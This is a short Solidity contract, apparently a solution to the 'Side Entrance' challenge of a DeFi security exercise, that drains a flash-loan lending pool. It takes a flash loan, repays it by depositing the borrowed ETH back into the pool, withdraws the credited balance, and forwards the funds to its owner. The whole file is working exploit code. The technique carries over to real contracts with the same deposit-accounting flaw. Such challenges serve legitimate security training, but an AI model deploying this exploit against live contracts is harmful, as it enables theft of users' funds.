// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "../side-entrance/SideEntranceLenderPool.sol";

contract AttackSideEntrance is Ownable {

    SideEntranceLenderPool private immutable pool;

    constructor(address poolAddress) {
        pool = SideEntranceLenderPool(poolAddress);
    }


    function flashLoanAttack(uint256 amount) public onlyOwner {
        pool.flashLoan(amount);
    }
 
    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function withdrawFromLenderPool() public onlyOwner {
        pool.withdraw();
    }

    receive () external payable {
        payable(owner()).transfer(address(this).balance - 10 ** 18);
    }

}
